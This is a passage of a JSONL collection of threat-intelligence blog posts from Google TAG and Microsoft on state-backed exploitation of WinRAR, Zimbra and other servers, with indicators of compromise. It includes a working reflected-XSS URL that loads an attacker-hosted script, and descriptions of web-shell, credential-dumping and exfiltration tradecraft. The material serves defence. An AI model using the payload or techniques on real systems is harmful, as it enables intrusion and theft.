campaign is not connected to the one described in today’s post.\nRelated IOCs Delivery URLs - http://103[.]255[.]44[.]56:8372/6nE5dJzUM2wV.html - http://103[.]255[.]44[.]56:8371/00AnW8Lt0NEM.html - http://103[.]255[.]44[.]56:8371/SxYm5vpo2mGJ?rid= - http://103[.]255[.]44[.]56:8371/iWBveXrdvQYQ?rid=?rid= - https://appleid-server[.]com/EvgSOu39KPfT.html - https://www[.]apple-webservice[.]com/7pvWM74VUSn2.html - https://appleid-server[.]com/server.enc - https://amnestyhk[.]org/ss/defaultaa.html - https://amnestyhk[.]org/ss/4ba29d5b72266b28.html - https://amnestyhk[.]org/ss/mac.js Javascript - cbbfd767774de9fecc4f8d2bdc4c23595c804113a3f6246ec4dfe2b47cb4d34c (capstone.js) - bc6e488e297241864417ada3c2ab9e21539161b03391fc567b3f1e47eb5cfef9 (mac.js) - 9d9695f5bb10a11056bf143ab79b496b1a138fbeb56db30f14636eed62e766f8 Sandbox escape / LPE - 8fae0d5860aa44b5c7260ef7a0b277bcddae8c02cea7d3a9c19f1a40388c223f - df5b588f555cccdf4bbf695158b10b5d3a5f463da7e36d26bdf8b7ba0f8ed144 Backdoor - cf5edcff4053e29cb236d3ed1fe06ca93ae6f64f26e25117d68ee130b9bc60c8 (2021 sample) - f0b12413c9d291e3b9edd1ed1496af7712184a63c066e1d5b2bb528376d66ebc (2019 sample) C2 - 123.1.170.152 - 207.148.102.208","num_sentences":68,"metadata":{"source":"blog","platform":"Google_TAG","filename":"watering-hole"}}
{"id":49,"title":"Government-backed actors exploiting WinRAR vulnerability","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/","clean_text":"Government-backed actors exploiting WinRAR vulnerability In recent weeks, Google’s Threat Analysis Group’s (TAG) has observed multiple government-backed hacking groups exploiting the known vulnerability, CVE-2023-38831, in WinRAR, which is a popular file archiver tool for Windows.\nCybercrime groups began exploiting the vulnerability in early 2023, when the bug was still unknown to defenders.\nA patch is now available, but many users still seem to be vulnerable.\nTAG has observed government-backed actors from a number of countries exploiting the WinRAR vulnerability as part of their operations.\nTo ensure protection, we urge organizations and users to keep software fully up-to-date and to install security updates as soon as they become available.\nAfter a vulnerability has been patched, malicious actors will continue to rely on n-days and use slow patching rates to their advantage.\nWe also recommend use of Google’s Safe Browsing and Gmail, which block files containing the exploit.\nPatch and proof-of-concept In August 2023, RARLabs released an updated version of WinRAR that included fixes for several security-related bugs.\nOne of those bugs, later assigned CVE-2023-38831, is a logical vulnerability within WinRAR causing extraneous temporary file expansion when processing crafted archives, combined with a quirk in the implementation of Windows’ ShellExecute when attempting to open a file with an extension containing spaces.\nThe vulnerability allows attackers to execute arbitrary code when a user attempts to view a benign file (such as an ordinary PNG file) within a ZIP archive.\nAs detailed in a blog post from Group-IB, the vulnerability had been exploited as 0-day by cybercrime actors in-the-wild since at least April 2023 for campaigns targeting financial traders to deliver various commodity malware families.\nHours after the blog post was released, proof of concepts and exploit generators were uploaded to public GitHub repositories.\nShortly after that, TAG began to observe testing activity from both financially motivated and APT actors experimenting with CVE-2023-38831.\nVulnerability Consider the following archive structure: When a user double-clicks on a benign “poc.png_” (underscore is used to indicate a space) from WinRAR’s user interface, WinRAR prior to 6.23 will instead execute “poc.png_/poc.png_.cmd”.\nAfter a user double-clicks on a file, WinRAR attempts to determine which files need to be temporarily expanded by iterating through all archive entries.\nHowever, due to the way the matching is made, if a directory is found with the same name as the selected entry, both the selected file and the files inside a matched directory are extracted to the root of a random temporary directory.\nThe pseudocode below shows WinRAR’s extraction logic and whether an archive entry should to be extracted: When writing contents of the files, WinRAR performs path normalization that removes appended spaces, because Windows doesn’t allow files with trailing spaces.\nFinally, WinRAR calls ShellExecuteExW, passing the non-normalized path with a trailing space “%TEMP%\\{random_directory}\\poc.png_” to run the user-selected file.\nInternally, ShellExecute attempts to identify file extensions by calling “shell32!PathFindExtension” which fails because extensions with spaces are considered invalid.\nInstead of bailing out, ShellExecute proceeds to call “shell32!ApplyDefaultExts” which iterates through all files in a directory, finding and executing the first file with an extension matching any of the hardcoded ones: “.pif, .com, .exe, .bat, .lnk, .cmd”.\nNote, that while most samples exploiting CVE-2023-3883 use an archive entry with a trailing space, it is not a requirement, and a space in any position in the file extension is sufficient to trigger the bug (e.g. entry with “poc.invalid_ext” will also result in “shell32!ApplyDefaultExts” code path to be taken).\nThis quirk in ShellExecute, causing the default extension search logic to be applied when attempting to open a file with an extension containing spaces is what causes “poc.png_.cmd” to be selected and inadvertently run, even though it was not the file the user originally double-clicked on.\nCampaigns FROZENBARENTS impersonates Ukrainian drone training school to deliver Rhadamanthys infostealer In a blog post earlier this year, TAG reported on FROZENBARENTS (aka SANDWORM) targeting the energy sector and continuing hack & leak operations.\nThe group, attributed to Russian Armed Forces’ Main Directorate of the General Staff (GRU) Unit 74455, on September 6th launched an email campaign impersonating a Ukrainian drone warfare training school.\nUsing a lure themed as an invitation to join the school, the email contained a link to an anonymous file-sharing service, fex[.]net, which delivered a benign decoy PDF document with a drone operator training curriculum and a malicious ZIP file exploiting CVE-2023-38831 titled “Навчальна-програма-Оператори.zip” (Training program operators). “\nTraining of drone operators” decoy document from FROZENBARENTS campaign The payload, found in “Навчальна-програма-Оператори.pdf /Навчальна-програма-Оператори.pdf_.bat” was a packed Rhadamanthys infostealer.\nRhadamanthys is a commodity infostealer that is able to collect and exfiltrate browser credentials and session information among other things.\nIt operates on a subscription-based model and can be rented out for as low as $250 for 30 days.\nUsage of commercially available infostealers, that are typically employed by cybercrime actors, is atypical of FROZENBARENTS.\nFROZENLAKE spear-phishing campaign targeting Ukrainian government organizations hosted on API endpoint testing services On September 4th, CERT-UA posted about FROZENLAKE (aka APT28), a group attributed to Russian GRU, using CVE-2023-38831 to deliver malware targeting energy infrastructure.\nTAG observed that FROZENLAKE used a free hosting provider to serve CVE-2023-38831 to target users in Ukraine.\nThe initial page redirected users to a mockbin site to perform browser checks and redirect to the next stage, which would ensure the visitor was coming from an IPv4 address in Ukraine and would prompt the user to download a file containing a CVE-2023-38831 exploit.\nThe decoy document was an event invitation from Razumkov Centre, a public policy think tank in Ukraine.\nFROZENLAKE decoy document impersonating a Ukrainian public policy think tank FROZENLAKE using IRONJAW with reverse SSH shell A sample with a filename “IOC_09_11.rar” (072afea7cae714b44c24c16308da0ef0e5aab36b7a601b310d12f8b925f359e7) was uploaded to VirusTotal on September 11th.\nThe sample exploits CVE-2023-38831 to drop a BAT file which opens a decoy PDF file and creates a reverse SSH shell to an attacker controlled IP address, and executes IRONJAW script using PowerShell.\nIRONJAW is a small PowerShell script that steals browser login data and local state directories, exfiltrating them to a C2 on “http://webhook[.]site/e2831741-d8c8-4971-9464-e52d34f9d611”.\nIRONJAW was first observed being distributed by ISO files hosted on free hosting providers in late July through early August and attributed to FROZENLAKE.\nThe additional delivery of IRONJAW via exploitation of CVE-2023-38831 and the reverse SSH tunnel were new additions to the typical FROZENLAKE toolkit.\nISLANDDREAMS delivering BOXRAT in campaign targeting Papua New Guinea TAG has also observed government-backed groups linked to China exploit CVE-2023-38831.\nIn late August, ISLANDDREAMS (aka APT40) launched a phishing campaign targeting Papua New Guinea.\nThe phishing emails included a Dropbox link to a ZIP archive containing the CVE-2023-38831 exploit, a password-protected decoy PDF, and an LNK file.\nDecoy PDF used in ISLANDDREAMS campaign The next stage payload, ISLANDSTAGER, is either an XOR-encoded DLL found at a hardcoded offset inside of the LNK, or downloaded from a hardcoded URL of a file-sharing service.\nISLANDSTAGER is then executed by starting a legit “ImagingDevices.exe” process which sideloads malicious “STI.dll” from “%ProgramData%\\Microsoft\\DeviceSync\\”.\nISLANDSTAGER configures persistence by adding “ImagingDevices.exe” to “CurrentVersion\\Run” registry key.\nIt then decodes several layers of shellcode, the last of which is generated using Donut, that loads and executes the final payload, BOXRAT, in-memory.\nBOXRAT is a .NET backdoor that uses Dropbox API as a C2 mechanism.\nConclusion The widespread exploitation of the WinRAR bug highlights that exploits for known vulnerabilities can be highly effective, despite a patch being available.\nEven the most sophisticated attackers will only do what is necessary to accomplish their goals.\nThese recent campaigns exploiting the WinRAR bug underscore the importance of patching and that there is still work to be done to make it easy for users to keep their software secure and up-to-date.\nTAG will continue to compile and share threat intelligence for the protection of online users and Google products, in the meantime, we encourage organizations and users to keep their software fully up-to-date.\nIndicators of compromise (IoCs) FROZENBARENTS - https://fex[.]net/s/bttyrz4 - https://fex[.]net/s/59znp5b FROZENLAKE - 072afea7cae714b44c24c16308da0ef0e5aab36b7a601b310d12f8b925f359e7 - 91dec1160f3185cec4cb70fee0037ce3a62497e830330e9ddc2898f45682f63a - 77cf5efde721c1ff598eeae5cb3d81015d45a74d9ed885ba48330f37673bc799 - 216.66.35[.]145 - http://webhook[.]site/e2831741-d8c8-4971-9464-e52d34f9d611 ISLANDDREAMS - https://filetransfer[.]io/data-package/DVagoJxL/download","num_sentences":51,"metadata":{"source":"blog","platform":"Google_TAG","filename":"winrar"}}
{"id":50,"title":"Zimbra 0-day used to target international government organizations","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/","clean_text":"Zimbra 0-day used to target international government organizations In June 2023, Google’s Threat Analysis Group (TAG) discovered an in-the-wild 0-day exploit targeting Zimbra Collaboration, an email server many organizations use to host their email.\nSince discovering the 0-day, now patched as CVE-2023-37580, TAG has observed four different groups exploiting the same bug to steal email data, user credentials, and authentication tokens.\nMost of this activity occurred after the initial fix became public on Github.\nTo ensure protection against these types of exploits, TAG urges users and organizations to keep software fully up-to-date and apply security updates as soon as they become available.\n0-day discovery, hotfix and patch TAG first discovered the 0-day, a reflected cross-site scripting (XSS) vulnerability, in June when it was actively exploited in targeted attacks against Zimbra’s email server.\nZimbra pushed a hotfix to their public Github on July 5, 2023 and published an initial advisory with remediation guidance on July 13, 2023.\nThey patched the vulnerability as CVE-2023-37580 on July 25, 2023.\nTAG observed three threat groups exploiting the vulnerability prior to the release of the official patch, including groups that may have learned about the bug after the fix was initially made public on Github.\nTAG discovered a fourth campaign using the XSS vulnerability after the official patch was released.\nThree of these campaigns began after the hotfix was initially made public highlighting the importance of organizations applying fixes as quickly as possible.\nThe Vulnerability CVE-2023-37580 CVE-2023-37580 is a reflected cross-site scripting (XSS) vulnerability.\nXSS is a web application vulnerability that allows malicious scripts to be injected into another website.\nIn this case, there was a vulnerability in Zimbra that injected the parameter within the URL directly into the webpage, causing the script to be executed.\nAn example that could trigger the XSS is: https://mail.\nREDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F which decodes to: https://mail.\nREDACTED[.]com/m/momoveto?st=acg\"/>// The fix was to escape the contents of the st parameter before it was set as the value in an html object.\nCampaign 1: First known exploitation leads to email-stealing framework The initial in-the-wild discovery of the 0-day vulnerability was a campaign targeting a government organization in Greece.\nThe attackers sent emails containing exploit urls to their targets.\nIf a target clicked the link during a logged-in Zimbra session, the url loaded the same framework that Volexity documented in February 2022.\nThis framework uses the XSS to steal users’ mail data, such as emails and attachments and to set up an auto-forwarding rule to an attacker-controlled email address.\nThe framework was loaded from: https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js Campaign 2: Winter Vivern exploitation after hotfix pushed to Github The patch for the vulnerability was pushed to Github on July 5.\nAnother actor exploited the vulnerability for a full two weeks beginning on July 11 before the official patch became available on July 25.\nTAG identified multiple exploit urls that targeted government organizations in Moldova and Tunisia; each url contained a unique official email address for specific organizations in those governments.\nTAG attributes this activity to Winter Vivern (UNC4907), an APT group known to exploit XSS in Zimbra and Roundcube.\nThe vulnerability was used to load scripts at: https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js https://applicationdevsoc[.]com/tndgt/auth.js Campaign 3: Exploit used for credential phishing Days before Zimbra pushed their official patch on July 25, TAG observed a third, unidentified group exploiting the vulnerability as part of a campaign that phished for credentials belonging to a government organization in Vietnam.\nIn this case, the exploit url pointed to a script that displayed a phishing page for users’ webmail credentials and posted stolen credentials to a url hosted on an official government domain that the attackers likely compromised.\nCampaign 4: N-day exploit used for stealing authentication token In August 2023, after the patch for CVE-2023-37580 was released, TAG discovered a fourth campaign using the vulnerability against a government organization in Pakistan.\nThe exploit was used to steal the Zimbra authentication token.\nThe token was exfiltrated to ntcpk[.]org.\nConclusion The discovery of at least four campaigns exploiting CVE-2023-37580, three campaigns after the bug first became public, demonstrates the importance of organizations applying fixes to their mail servers as soon as possible.\nThese campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users.\nThe actors behind Campaign #2 began exploiting the bug after the fix was pushed to Github, but before Zimbra publicly released the advisory with remediation advice.\nThe exploitation of CVE-2023-37580 comes on the heels of CVE-2022-24682, another reflected XSS vulnerability in Zimbra mail servers that was actively exploited in-the-wild in 2022 and is followed by the exploitation of CVE-2023-5631, a XSS vulnerability in Roundcube mail servers just this past month.\nThe regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.\nWe’d like to acknowledge Zimbra for their response and patching of this vulnerability.\nFollowing our disclosure policy, TAG shares its research to raise awareness and advance security across the ecosystem.\nWe also add all identified websites and domains to Safe Browsing to safeguard users from further exploitation.\nWe urge users and organizations to apply patches quickly and keep software fully up-to-date for their protection.\nTAG will remain focused on detecting, analyzing, and preventing 0-day exploitation as well as reporting vulnerabilities to vendors immediately upon discovery.\nIndicators of compromise (IoCs) - https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js - https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js - https://applicationdevsoc[.]com/tndgt/auth.js - ntcpk[.]org Thanks to TAG's Kristen Dennesen who also contributed to this report.","num_sentences":40,"metadata":{"source":"blog","platform":"Google_TAG","filename":"zimbra"}}
{"id":51,"title":"The BadPilot campaign: Seashell Blizzard subgroup conducts multiyear global access operation | Microsoft Security Blog","publish_date":"2022-04-28","link":"https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/","clean_text":"Microsoft is publishing for the first time our research into a subgroup within the Russian state actor Seashell Blizzard and its multiyear initial access operation, tracked by Microsoft Threat Intelligence as the “BadPilot campaign”.\nThis subgroup has conducted globally diverse compromises of Internet-facing infrastructure to enable Seashell Blizzard to persist on high-value targets and support tailored network operations.\nThis blog details this subgroup’s recently observed tactics, techniques, and procedures (TTPs), and describes three of its distinct exploitation patterns.\nThe geographical targeting to a near-global scale of this campaign expands Seashell Blizzard’s scope of operations beyond Eastern Europe.\nAdditionally, the opportunistic access methods outlined in this campaign will continue to offer Russia opportunities for niche operations and activities.\nActive since at least 2021, this subgroup within Seashell Blizzard has leveraged opportunistic access techniques and stealthy forms of persistence to collect credentials, achieve command execution, and support lateral movement that has at times led to substantial regional network compromises.\nObserved operations following initial access indicate that this campaign enabled Seashell Blizzard to obtain access to global targets across sensitive sectors including energy, oil and gas, telecommunications, shipping, arms manufacturing, in addition to international governments.\nWe assess that this subgroup has been enabled by a horizontally scalable capability bolstered by published exploits that allowed Seashell Blizzard to discover and compromise numerous Internet-facing systems across a wide range of geographical regions and sectors.\nSince early 2024, the subgroup has expanded its range of access to include targets in the United States and United Kingdom by exploiting vulnerabilities primarily in ConnectWise ScreenConnect (CVE-2024-1709) IT remote management and monitoring software and Fortinet FortiClient EMS security software (CVE-2023-48788).\nThese new access operations built upon previous efforts between 2021 and 2023 which predominantly affected Ukraine, Europe, and specific verticals in Central and South Asia, and the Middle East.\nMicrosoft Threat Intelligence assesses that while some of the subgroup’s targeting is opportunistic, its compromises cumulatively offer Seashell Blizzard options when responding to Russia’s evolving strategic objectives.\nSince April 2022, Russia-aligned threat actors have increasingly targeted international organizations that are either geopolitically significant or provide military and/or political support to Ukraine.\nIn addition to establishing access to these targets outside Ukraine, we assess that the subgroup has likely enabled at least three destructive cyberattacks in Ukraine since 2023 (see below discussion of Seashell Blizzard for more information about their activities against Ukraine).\nSeashell Blizzard’s far-reaching access operations pose a significant risk to organizations within the group’s strategic purview.\nDespite the commodity nature of this subgroup’s exploitation patterns, notable shifts within the actor’s post-compromise tradecraft are reflected within the subgroup’s activities, which may carry over to other aspects of Seashell Blizzard’s more traditional operations and carry more significant implications for auditing during incident response.\nMicrosoft Threat Intelligence tracks campaigns launched by Seashell Blizzard as well as this subgroup, and when able, directly notifies customers who have been targeted or compromised, providing them with the necessary information to help secure their environments.\nAs part of our continuous monitoring, analysis, and reporting on the threat landscape, we are sharing our research on this campaign’s activity to raise awareness of the observed TTPs and to educate organizations on how to harden their attack surfaces against this and similar activity.\nWho is Seashell Blizzard?\nSeashell Blizzard is a high-impact threat actor linked to the Russian Federation that conducts global activities on behalf of Russian Military Intelligence Unit 74455 (GRU).\nSeashell Blizzard’s specialized operations have ranged from espionage to information operations and cyber-enabled disruptions, usually in the form of destructive attacks and manipulation of industrial control systems (ICS).\nActive since at least 2013, this threat actor’s prolific operations include destructive attacks such as KillDisk (2015) and FoxBlade (2022), supply-chain attacks (MeDoc, 2017), and pseudo-ransomware attacks such as NotPetya (2017) and Prestige (2022), in addition to numerous other specialized disruptive capabilities.\nSeashell Blizzard is assessed to be highly skilled at enabling broad and persistent access against priority computer networks, which sometimes gives the group significant tenure for future potential follow-on activity.\nDue to their specialization in computer network exploitation (CNE) and expertise targeting critical infrastructure such as ICS and supervisory control and data acquisition systems (SCADA), Seashell Blizzard’s operations have frequently been leveraged during military conflicts and as an adaptable element during contentious geopolitical events.\nHistorically, some of Seashell Blizzard’s operations may be considered part of a spectrum of retaliatory actions sometimes used by the Russian Federation.\nSince Russia’s invasion of Ukraine in 2022, Seashell Blizzard has conducted a steady stream of operations complementing Russian military objectives.\nThe threat actor’s longstanding strategic targets in the region have included critical infrastructure such as energy and water, government, military, transportation and logistics, manufacturing, telecommunications, and other supportive civilian infrastructure.\nSince at least April 2023, Seashell Blizzard has increased targeting of military communities in the region, likely for tactical intelligence gain.\nTheir persistent targeting of Ukraine suggests Seashell Blizzard is tasked to obtain and retain access to high-priority targets to provide the Russian military and Russian government a range of options for future actions.\nSeashell Blizzard’s network intrusions leverage diverse tradecraft and typically employ a range of common publicly available tools, including Cobalt Strike and DarkCrystalRAT.\nNetwork intrusions linked to the threat actor have affected multiple tiers of infrastructure, showcasing Seashell Blizzard’s abilities to target end users, network perimeters, and vertical-specific systems leveraging both publicly available and custom exploits and methods.\nSince February 2022, Seashell Blizzard has generally taken three approaches to their network intrusions: - Targeted: Seashell Blizzard has frequently used tailored mechanisms to access targets, including scanning and exploitation of specific victim infrastructure, phishing, and modifying legitimate functionality of existing systems to either expand network access or obtain confidential information. -\nOpportunistic: Seashell Blizzard has increasingly used broad exploitation of Internet-facing infrastructure and distribution of malware implants spread through trojanized software to achieve scalable but indiscriminate access.\nIn cases where a resulting victim is identified as strategically valuable, Microsoft Threat Intelligence has observed the threat actor conducting significant post-compromise activities. -\nHybrid: Seashell Blizzard has very likely gained access to target organizations using a limited supply-chain attack narrowly focused within Ukraine, an operation that was recently mitigated by the Computer Emergency Response Team of Ukraine (CERT-UA).\nOther hybrid methods have included compromise of regional managed IT service providers, which often afforded regional or vertical-specific access to diverse targets.\nSeashell Blizzard overlaps with activity tracked by other security vendors as BE2, UAC-0133, Blue Echidna, Sandworm, PHANTOM, BlackEnergy Lite, and APT44.\nAttribution assessment Microsoft Threat Intelligence assesses that the initial access subgroup is linked to Seashell Blizzard.\nDespite the subgroup’s opportunistic tactics, we are able to distinguish this subgroup due to its consistent use of distinct exploits, tooling, infrastructure, and late-stage methods used to establish persistence.\nMoreover, our longstanding forensic investigation uncovered distinct post-compromise activities, a part of which incorporated specific operational capabilities and resources chiefly utilized by Seashell Blizzard.\nWe have also observed the initial access subgroup to pursue access to an organization prior to a Seashell Blizzard-linked destructive attack.\nScope of operations and targeting trends Microsoft Threat Intelligence assesses that Seashell Blizzard uses this initial access subgroup to horizontally scale their operations as new exploits are acquired and to sustain persistent access to current and future sectors of interest to Russia.\nThis subgroup conducts broad operations against a variety of sectors and geographical areas.\nIn 2022, its primary focus was Ukraine, specifically targeting the energy, retail, education, consulting, and agriculture sectors.\nIn 2023, it globalized the scope of its compromises, leading to persistent access within numerous sectors in the United States, Europe, Central Asia, and the Middle East.\nIt frequently prioritized sectors that either provided material support to the war in Ukraine or were geopolitically significant.\nIn 2024, while the exposure of multiple vulnerabilities likely offered the subgroup more access than ever, it appeared to have honed its focus to the United States, Canada, Australia, and the United Kingdom.\nThis subgroup’s historical pattern of exploitation has also led to the compromise of globally diverse organizations that appear to have limited or no utility to Russia’s strategic interests.\nThis pattern suggests the subgroup likely uses an opportunistic “spray and pray” approach to achieving compromises at scale to increase the likelihood of acquiring access at targets of interest with limited tailored effort.\nIn cases where a strategically significant target is compromised, we have observed significant later post-compromise activity.\nThe geographic focus of the subgroup frequently transitions between broad campaigns against multiple geographic targets and a narrow focus on specific regions or countries, demonstrating the subgroup’s flexibility to pursue unique regional objectives.\nInitial access subgroup opportunistically compromises perimeter infrastructure using published CVEs Since late 2021, Seashell Blizzard has used this initial access subgroup to conduct targeted operations by exploiting vulnerable Internet-facing infrastructure following discovery through direct scanning and, more uniquely, use of third-party internet scanning services and knowledge repositories.\nThese exploitation efforts are followed by an operational lifecycle using a consistent set of TTPs to support persistence and lateral movement, which have incrementally evolved to become more evasive over time.\nMicrosoft Threat Intelligence has identified at least three distinct exploitation patterns and operational behaviors linked to this subgroup, which are described in more detail below: To date, at least eight vulnerabilities common within specific categories of server infrastructure typically found on network perimeters of small office/home office (SOHO) and enterprise networks have been exploited by this subgroup: - Microsoft Exchange (CVE-2021-34473) - Zimbra Collaboration (CVE-2022-41352) - OpenFire (CVE-2023-32315) - JetBrains TeamCity (CVE-2023-42793) - Microsoft Outlook (CVE-2023-23397) - Connectwise ScreenConnect (CVE-2024-1709) - Fortinet FortiClient EMS (CVE-2023-48788) - JBOSS (exact CVE is unknown) In nearly all cases of successful exploitation, Seashell Blizzard carried out measures to establish long-term persistence on affected systems.\nThis persistent access is noted in at least three cases to have preceded select destructive attacks attributed to Seashell Blizzard, highlighting that the subgroup may periodically enable destructive or disruptive attacks.\nExploitation patterns We have observed the initial access subgroup using three specific exploit patterns: Deployment of remote management and monitoring (RMM) suites for persistence and command and control (February 24, 2024 – present) In early 2024, the initial access subgroup began using RMM suites, which was a novel technique used by Seashell Blizzard to achieve persistence and command and control (C2).\nThis was first observed when the subgroup exploited vulnerabilities in ConnectWise ScreenConnect (CVE-2024-1709) and Fortinet FortiClient EMS (CVE-2023-48788).\nThe subgroup then deployed RMM software such as Atera Agent and Splashtop Remote Services.\nThe use of RMM software allowed the threat actor to retain critical C2 functions while masquerading as a legitimate utility, which made it less likely to be detected than a remote access trojan (RAT).\nWhile these TTPs have been used by other nation-state threat actors since at least 2022, including by Iranian state actor Mango Sandstorm, the Seashell Blizzard initial access subgroup’s specific techniques are considered distinct.\nDuring the first weeks of this exploitation pattern, the initial access subgroup primarily targeted organizations in Ukraine, the United States, Canada, the United Kingdom, and Australia.\nIt is highly likely that Seashell Blizzard conducted post-compromise activity at only a limited number of organizations that were part of this initial victim pool.\nFor these organizations, Seashell Blizzard conducted preliminary credential access through multiple means and deployed at least one custom utility to facilitate remote access and tunneling (see the section on ShadowLink below for more information).\nBoth CVE-2024-1709 and CVE-2023-48788 provided the ability to launch arbitrary commands on a vulnerable server.\nFollowing exploitation, the subgroup used two methods of payload retrieval to install RMM agents on affected servers: - Retrieval of Atera Agent installers from legitimate agent endpoints – Commonly observed on exploited ScreenConnect servers, Seashell Blizzard used resulting command execution to retrieve Atera installers via Bitsadmin and curl from legitimate installation URLs hosted by Atera. -\nRetrieval of Atera Agent from actor-controlled infrastructure – During exploitation of CVE-2023-48788 between April 9 and April 10, 2024, Seashell Blizzard retrieved remote agent installers from actor-controlled virtual private server (VPS) infrastructure.\nFollowing installation of RMM software, Seashell Blizzard uses the native functionality of the agents to deploy secondary tools to help credential acquisition, data exfiltration, and upload of custom utilities to facilitate more robust access to compromised systems.\nSeashell Blizzard likely uses three primary methods of credential access: - Registry-based credential access via reg.exe: - Credential access via renamed procdump: - Since RMM agents typically afford an interactive graphical interface, native credential access mechanisms common via task manager were likely also carried out.\nIn addition, credential access via Taskmanager UI by LSASS process dumping was likely also employed.\nDuring Seashell Blizzard intrusions, we observed rclone.exe deployed to affected servers and subsequently used to carry out data exfiltration using an actor-supplied configuration file.\nAmong a subgroup of victims, Seashell Blizzard carried out unique post-compromise activity, indicating that the threat actor sought more durable persistence and direct access.\nIn these cases, Seashell Blizzard deployed OpenSSH with a unique public key, allowing them to access compromised systems using an actor-controlled account and credential, in addition to a unique persistence and assured C2 method known to Microsoft Threat Intelligence as ShadowLink.\nShadowLink facilitates persistent remote access by configuring a compromised system to be registered as a Tor hidden service.\nThis is achieved using a combination of Tor service binaries and a unique actor-defined Tor configuration file (referred as the ‘torrc’) configuring the system for remote access.\nSystems compromised with ShadowLink receive a unique .onion address, making them remotely accessible via the Tor network.\nThis capability allows Seashell Blizzard to bypass common exploit patterns of deploying a RAT, which commonly leverages some form of C2 to actor-controlled infrastructure that are often easily audited and identified by network administrators.\nInstead, by relying on Tor hidden services, the compromised system creates a persistent circuit to the Tor network, acting as a covert tunnel, effectively cloaking all inbound connections to the affected asset and limiting exposures from both the actor and victim environment.\nShadowLink contains two primary components: a legitimate Tor service binary and a torrc which contains requisite configurations for the Tor hidden services address—specifically, port-forwarding for common services such as Remote Desktop Protocol (RDP) and SecureShell (SSH) Protocol.\nCommonly, Seashell Blizzard has utilized ShadowLink to redirect inbound connections to the Tor hidden service address to ports for RDP (3389).\nShadowLink persisted via a system service: Microsoft Threat Intelligence has also observed Forest Blizzard, a separate GRU actor, leveraging similar Tor-based capabilities in their operations.\nWeb shell deployment for persistence and C2 (late 2021 – present) Since late 2021, the Seashell Blizzard initial access subgroup has primarily deployed web shells following successful exploitation to maintain footholds and achieve the ability to execute commands necessary to deploy secondary tooling to assist lateral movement.\nTo date, this exploit pattern remains its predominant persistence method.\nBeginning in mid-2022, this pattern of exploitation enabled unique post-compromise activities against organizations in Central Asia and Europe, which were likely intended to further Russia’s geopolitical objectives and preposition against select strategic targets.\nExploitation of Microsoft Exchange and Zimbra vulnerabilities Microsoft Threat Intelligence has identified at least two web shells consistently deployed by this initial access subgroup.\nWhile web shells can be deployed using a variety of methods, they are most often deployed following the exploitation of vulnerabilities allowing remote code execution (RCE) or achieving some level of arbitrary file upload.\nIn the case of the initial access subgroup, we have observed web shells deployed following exploitation of vulnerabilities in Microsoft Exchange (CVE-2021-34473) and Zimbra (CVE-2022-41352).\nIn cases where RCE is available, the initial access subgroup routinely retrieves web shells from actor-controlled infrastructure.\nThis infrastructure can be either legitimate but compromised websites or dedicated actor infrastructure.\nWe observed the following web shell retrieval commands being used: Microsoft Threat Intelligence has identified a web shell that we assess as exclusive to the initial access subgroup and is associated with the previously mentioned web shell retrieval patterns.\nDetected as LocalOlive, this web shell is identified on compromised perimeter infrastructure and serves as the subgroup’s primary means of achieving C2 and deploying additional utilities to compromised infrastructure.\nWritten in ASPX supporting C#, the web shell carries sufficient yet rudimentary functionality to support the following secondary activities: - Upload and download files - Run shell commands - Open a port (default port is set to TCP 250) Figure 6.\nLocalOlive web shell def.aspx On October 24, 2022, the initial access subgroup successfully exploited CVE-2022-41352.\nThis Zimbra Collaborative vulnerability allows a threat actor to deploy web shells and other arbitrary files by sending an email with a specially crafted attachment, effectively exploiting an arbitrary file-write vulnerability.\nThe initial access subgroup leveraged this vulnerability to deliver a primitive web shell to affected servers, allowing for execution of arbitrary commands.\nEmails were sent from the following actor-controlled addresses: - akfcjweiopgjebvh@proton.me - ohipfdpoih@proton.me - miccraftsor@outlook.com - amymackenzie147@protonmail.ch - ehklsjkhvhbjl@proton.me - MirrowSimps@outlook.com Figure 7.\nWeb shell used during Zimbra exploitation Reconnaissance and fingerprinting After deploying web shells, the initial access subgroup then executes specific sequential commands below likely used to fingerprint and attribute victim networks; these patterns of behavior may indicate that either operators are quick to capitalize on compromises or the possible use of automation following successful exploitation.\nTunneling utilities deployment When Seashell Blizzard identifies targets of likely strategic value, it often furthers its network compromise by deploying tunneling utilities such as Chisel, plink, and rsockstun to established dedicated conduits into affected network segments.\nWhen Chisel is deployed, it often followed multiple naming conventions, including: - MsChSoft.exe - MsNan.exe - Msoft.exe - Chisel.exe - Win.exe - MsChs.exe - MicrosoftExchange32.exe - Desk.exe - Sys.exe For example, the initial access subgroup has used the following tunneling commands: When rsockstun is deployed, it has used naming conventions such as Sc.exe.\nTunneling launch When establishing tunnels, the initial access subgroup has routinely established reverse tunnels to exclusive VPS actor-owned infrastructure, including: | Tunneling IP | First observed used | Last observed used | | 103.201.129[.]130 | May 2022 | July 2022 | | 104.160.6[.]2 | September 2022 | December 2022 | | 195.26.87[.]209 | September 2023 | April 2024 | Note that these IP addresses are relevant within or around the timeframes enumerated in the table above.\nSome IP addresses may no longer be used by Seashell Blizzard at the time of this writing but are provided for historical and forensic understanding.\nModification of infrastructure to expand network influence through credential collection (late 2021 – 2024) In targeted operations where the initial access subgroup is likely seeking network access, Microsoft Threat Intelligence has observed subsequent malicious modifications to network resources including Outlook Web Access (OWA) sign-in pages and DNS configurations.\nModifying network resources allows Seashell Blizzard to passively gather relevant network credentials, which may be used to expand the actor’s access to sensitive information and widen its access to target networks in general.\nNotably, the infrastructure associated with this unique technique is sometimes also used in the two prior exploitation patterns, highlighting the versatility of late-stage infrastructure which may not always be limited to 